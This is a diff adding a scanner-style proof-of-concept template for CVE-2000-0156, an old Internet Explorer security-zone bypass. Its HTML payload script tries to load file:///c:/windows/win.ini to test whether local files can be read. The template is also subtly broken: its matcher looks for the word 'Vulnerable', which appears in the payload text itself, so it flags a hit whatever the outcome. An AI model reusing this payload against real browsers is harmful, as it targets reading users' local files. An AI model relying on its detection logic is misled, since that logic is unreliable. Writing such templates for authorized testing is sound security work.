@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过构造恶意HTML页面，利用IE在窗口导航跨域切换时的安全域检查延迟，尝试读取客户端本地文件"
+id = "POC-AVE-2000-0140"
+name = "Microsoft Internet Explorer 图片源重定向安全域绕过漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0156",
+    "ie",
+    "image-source-redirect",
+]
+vuln_id = [
+    "CVE-2000-0156",
+    "AVE-2000-0140",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = "<html><body><script>function exploit(){var img=new Image();img.onload=function(){document.getElementById('result').innerHTML='Vulnerable: file read successful';};img.onerror=function(){document.getElementById('result').innerHTML='Not vulnerable or file not found';};img.src='file:///c:/windows/win.ini';}window.onload=exploit;</script><h1>IE Image Source Redirect PoC</h1><div id='result'>Testing</div></body></html>"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Vulnerable"]
